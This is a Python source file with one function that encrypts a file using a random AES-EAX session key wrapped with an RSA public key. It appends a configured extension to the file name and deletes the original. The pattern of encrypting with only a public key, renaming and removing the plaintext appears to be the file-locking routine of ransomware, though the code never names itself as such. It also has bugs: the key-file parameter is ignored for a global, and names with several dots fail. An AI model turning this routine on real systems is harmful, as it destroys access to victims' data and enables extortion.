from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from variable import *
import os

def encrypt(fileToEncrypt, filePub):
    """
    USE EAX mode to allow detection of unauthorized modifications
    """
    filePub = open(publicKey, "rb")
    key = RSA.importKey(filePub.read())
    fileData = open(fileToEncrypt, "rb")
    data = fileData.read()
    data = bytes(data)
    sessionKey = os.urandom(16)
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    [ fileName, fileExtension ] = fileToEncrypt.split('.')
    encryptedFile = fileName + "." + fileExtension + extensionToAppend
    with open(encryptedFile,  'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    print('Encrypted file saved to ' + encryptedFile)
    filePub.close()
    fileData.close()
    os.remove(fileToEncrypt)

